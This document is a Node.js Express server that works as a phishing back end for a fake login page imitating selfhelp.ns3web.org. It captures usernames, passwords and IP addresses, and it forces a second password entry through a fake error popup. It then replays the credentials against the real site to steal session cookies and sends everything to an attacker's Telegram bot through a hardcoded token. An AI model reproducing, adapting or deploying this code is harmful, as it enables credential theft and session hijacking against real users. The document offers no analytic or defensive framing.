const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const URLSearchParams = require("url").URLSearchParams;

const app = express();
const PORT = 3000;
const LOG_FILE = path.join(__dirname, "logger.json");

// Telegram configuration (replace with your actual values)
const TELEGRAM_BOT_TOKEN = "7578811580:AAHt_l9I90faFqjaPhkTIJBUANhElCneKSg";
const TELEGRAM_CHAT_ID = "7207894371";

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "../public")));

async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error("❌ Telegram send error:", error.message);
    }
}

function logData(data) {
    fs.readFile(LOG_FILE, "utf8", (err, fileData) => {
        let logs = [];
        if (!err && fileData) logs = JSON.parse(fileData);
        
        const logEntry = {
            timestamp: new Date().toISOString(),
            ...data
        };

        logs.push(logEntry);
        
        fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), (err) => {
            if (err) console.error("❌ Error writing log file:", err);
        });

        // Send attempts and cookies to Telegram
        if (data.attempt || data.cookies) {
            let tgMessage = `<b>New Login Attempt (${data.attempt || "success"})</b>\n`
                + `IP: ${data.ip}\n`
                + `Username: <code>${data.username}</code>\n`
                + `Password: <code>${data.password}</code>\n`
                + `Remember Me: ${data.rememberMe}`;

            if (data.cookies) {
                tgMessage += `\n\n<b>🍪 Cookies:</b>\n<code>${data.cookies}</code>`;
            }

            sendToTelegram(tgMessage);
        }
    });
}

app.post("/login", async (req, res) => {
    const { username, password, rememberMe } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    let attempt = req.cookies.attempt || "first";

    // Log attempt
    logData({ attempt, username, password, rememberMe, ip });

    if (attempt === "first") {
        res.cookie("attempt", "second", { maxAge: 60000, httpOnly: true });
        return res.json({ showPopup: true });
    }

    try {
        const response = await axios.post(
            "https://selfhelp.ns3web.org/",
            new URLSearchParams({ UserName: username, Password: password }),
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Referer": "https://selfhelp.ns3web.org/"
                },
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status < 400
            }
        );

        const receivedCookies = response.headers["set-cookie"] || [];
        const sessionCookies = receivedCookies.map(cookie => cookie.split(";")[0]).join("; ");

        // Log successful login with sensitive details (not sent to Telegram)
        logData({
            status: "success",
            username,
            password,
            ip,
            cookies: sessionCookies, // Cookies will be sent to Telegram
            userAgent: req.headers["user-agent"],
            sessionMetadata: {
                server: response.headers["server"],
                contentType: response.headers["content-type"],
                date: response.headers["date"]
            }
        });

        res.clearCookie("attempt");
        return res.json({ redirectTo: "https://selfhelp.ns3web.org/" });

    } catch (error) {
        console.error("❌ External login failed:", error.message);
        return res.json({ showPopup: true });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});